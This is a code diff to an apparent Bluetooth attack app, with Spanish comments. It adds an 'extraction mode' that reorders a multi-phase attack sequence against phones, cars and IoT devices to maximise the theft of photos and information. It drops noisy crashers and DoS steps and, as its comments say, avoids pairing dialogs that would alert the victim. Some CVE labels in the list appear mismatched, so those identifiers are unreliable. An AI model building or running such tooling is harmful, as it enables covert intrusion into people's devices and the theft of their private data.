@@ -512,6 +512,10 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   bool _enablePatternAnalysis = true;
   bool _enableNetworkAnalysis = true;
    bool _enablePersistence = false;
+  // MODO EXTRACCIÓN: omite vectores que crashean o saturan el objetivo
+  // (SweynTooth/Blur/jams/DoS) y acciones intrusivas sin valor de datos,
+  // para maximizar la obtención de fotos e información.
+  bool _extractionFocus = true;
   // Bonding automático: DESACTIVADO por defecto. El objetivo puede no estar emparejado
   // y el diálogo de pareo delata la auditoría en su pantalla.
   bool _autoBonding = false;
@@ -737,10 +741,6 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       // ========== FASE 1: RECONOCIMIENTO (rápido, paralelo) ==========
       sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
       sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
-
-      // ========== FASE 1: RECONOCIMIENTO (rápido, paralelo) ==========
-      sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
-      sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
       sequence.add({'type': 'quickshare_discovery', 'name': 'QUICKSHARE_DISCOVERY', 'phase': 1, 'timeout': 10000, 'retries': 1});
 
       // ========== FASE 1.5: EXTRACCIÓN DE IMÁGENES (PRIORIDAD MÁXIMA) ==========
@@ -796,40 +796,45 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
       // ========== FASE 3: BLE EXPLOITS (paralelo) ==========
       if (hasBle) {
-        sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
-        sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
-        sequence.add({'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'phase': 3, 'timeout': 12000, 'retries': 2});
-        sequence.add({'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'phase': 3, 'timeout': 10000, 'retries': 1});
-        sequence.add({'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'phase': 3, 'timeout': 15000, 'retries': 2});
-        sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
-        sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
-        sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
+        // En modo extracción solo se conservan los vectores BLE que aportan
+        // datos (GATT) o acceso (pairing); los crashers/jammers se omiten
+        // porque rompen la conexión antes de poder extraer nada.
+        if (!_extractionFocus) sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
+        if (!_extractionFocus) sequence.add({'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'phase': 3, 'timeout': 12000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'phase': 3, 'timeout': 10000, 'retries': 1});
+        if (!_extractionFocus) sequence.add({'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
         // === Familias de capa de enlace (modernas): KNOB, BIAS, BleedingTooth ===
-        sequence.add({'type': 'knob', 'name': 'KNOB_KEYSIZE_7', 'phase': 3, 'timeout': 15000, 'retries': 2});
-        sequence.add({'type': 'cve_2021_10134_bias', 'name': 'BIAS_IMPERSONATION', 'phase': 3, 'timeout': 15000, 'retries': 2});
-        sequence.add({'type': 'cve_2020_26558_bleeding', 'name': 'BLEEDINGTOOTH', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'knob', 'name': 'KNOB_KEYSIZE_7', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'cve_2021_10134_bias', 'name': 'BIAS_IMPERSONATION', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'cve_2020_26558_bleeding', 'name': 'BLEEDINGTOOTH', 'phase': 3, 'timeout': 15000, 'retries': 2});
         sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
-        sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
-        sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
-        sequence.add({'type': 'cve_2025_10456_ble_fixed', 'name': 'BLE_FIXED_10456', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
+        if (!_extractionFocus) sequence.add({'type': 'cve_2025_10456_ble_fixed', 'name': 'BLE_FIXED_10456', 'phase': 3, 'timeout': 10000, 'retries': 2});
         sequence.add({'type': 'gatt_bulk_read', 'name': 'GATT_BULK_READ', 'phase': 3, 'timeout': 20000, 'retries': 2});
         sequence.add({'type': 'gatt_monitor', 'name': 'GATT_MONITOR', 'phase': 3, 'timeout': 35000, 'retries': 1});
-        sequence.add({'type': 'btle_spoof', 'command': 'identity', 'name': 'BLE_SPOOF', 'phase': 3, 'timeout': 10000, 'retries': 2});
-        sequence.add({'type': 'gatt_write', 'command': 'exploit', 'name': 'GATT_WRITE', 'phase': 3, 'timeout': 10000, 'retries': 2});
-        sequence.add({'type': 'ble_implement', 'name': 'BLE_IMPLEMENT', 'phase': 3, 'timeout': 10000, 'retries': 2});
-        sequence.add({'type': 'l2cap_pwn', 'name': 'L2CAP_PWN', 'phase': 3, 'timeout': 15000, 'retries': 2});
-        sequence.add({'type': 'cve_2025_26438_smp_bypass', 'name': 'SMP_BYPASS_26438', 'phase': 3, 'timeout': 15000, 'retries': 2});
-        sequence.add({'type': 'a2dp_exploit', 'name': 'A2DP_EXPLOIT', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'btle_spoof', 'command': 'identity', 'name': 'BLE_SPOOF', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'gatt_write', 'command': 'exploit', 'name': 'GATT_WRITE', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'ble_implement', 'name': 'BLE_IMPLEMENT', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'l2cap_pwn', 'name': 'L2CAP_PWN', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'cve_2025_26438_smp_bypass', 'name': 'SMP_BYPASS_26438', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'a2dp_exploit', 'name': 'A2DP_EXPLOIT', 'phase': 3, 'timeout': 15000, 'retries': 2});
         sequence.add({'type': 'hfp_inject', 'script': 'voice', 'name': 'HFP_VOICE', 'phase': 3, 'timeout': 10000, 'retries': 1});
-        sequence.add({'type': 'a2dp_record', 'duration': 30, 'name': 'A2DP_RECORD_30S', 'phase': 3, 'timeout': 35000, 'retries': 2});
-        sequence.add({'type': 'a2dp_stream', 'name': 'A2DP_STREAM', 'phase': 3, 'timeout': 350000, 'retries': 1});
+        if (!_extractionFocus) sequence.add({'type': 'a2dp_record', 'duration': 30, 'name': 'A2DP_RECORD_30S', 'phase': 3, 'timeout': 35000, 'retries': 2});
+        if (!_extractionFocus) sequence.add({'type': 'a2dp_stream', 'name': 'A2DP_STREAM', 'phase': 3, 'timeout': 350000, 'retries': 1});
       }
-      sequence.add({'type': 'blerp_attack', 'name': 'BLERP_REPAIRING', 'phase': 3, 'timeout': 12000, 'retries': 2});
+      if (!_extractionFocus) sequence.add({'type': 'blerp_attack', 'name': 'BLERP_REPAIRING', 'phase': 3, 'timeout': 12000, 'retries': 2});
 
       // ========== FASE 4: INYECCIÓN (SECUENCIAL) ==========
       if (dt.contains('smartphone') || dt.contains('car') || hasAndroid) {
         sequence.add({'type': 'at_injection', 'name': 'AT_INJECTION', 'phase': 4, 'timeout': 8000, 'retries': 2});
-        sequence.add({'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'phase': 4, 'timeout': 5000, 'retries': 1});
+        // AT_CALL omitido en modo extracción: marca una llamada real en el
+        // objetivo, es ruidoso/intrusivo y no aporta datos.
+        if (!_extractionFocus) sequence.add({'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'phase': 4, 'timeout': 5000, 'retries': 1});
       }
       if (dt.contains('smartphone') || dt.contains('tablet') || dt.contains('laptop')) {
         sequence.add({'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'phase': 4, 'timeout': 10000, 'retries': 2});
@@ -865,7 +870,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      // ==========================================
      // FASE 8: DoS (opcional, si stealth=off)
      // ==========================================
-      if (!_stealthMode && (deviceInfo['hasBle'] == true || dt.contains('iot') || dt.contains('smart_lock'))) {
+       if (!_extractionFocus && !_stealthMode && (deviceInfo['hasBle'] == true || dt.contains('iot') || dt.contains('smart_lock'))) {
        sequence.add({'type': 'dos', 'command': 'gatt_flood', 'name': 'DOS_GATT', 'phase': 8, 'timeout': 5000, 'retries': 1});
        sequence.add({'type': 'dos', 'command': 'l2cap_flood', 'name': 'DOS_L2CAP', 'phase': 8, 'timeout': 5000, 'retries': 1});
      }
@@ -2825,6 +2830,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     _appendLog('   • Modo sigiloso: ${_stealthMode ? "ON" : "OFF"}');
     _appendLog('   • Persistencia: ${_enablePersistence ? "ON" : "OFF"}');
     _appendLog('   • Bonding automático: ${_autoBonding ? "ON" : "OFF (objetivo no emparejado)"}');
+    _appendLog('   • MODO EXTRACCIÓN: ${_extractionFocus ? "ON — solo vectores que obtienen fotos/info" : "OFF — secuencia completa"}');
     _appendLog('⏱️ Duración estimada: ~5 min');
     _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
 
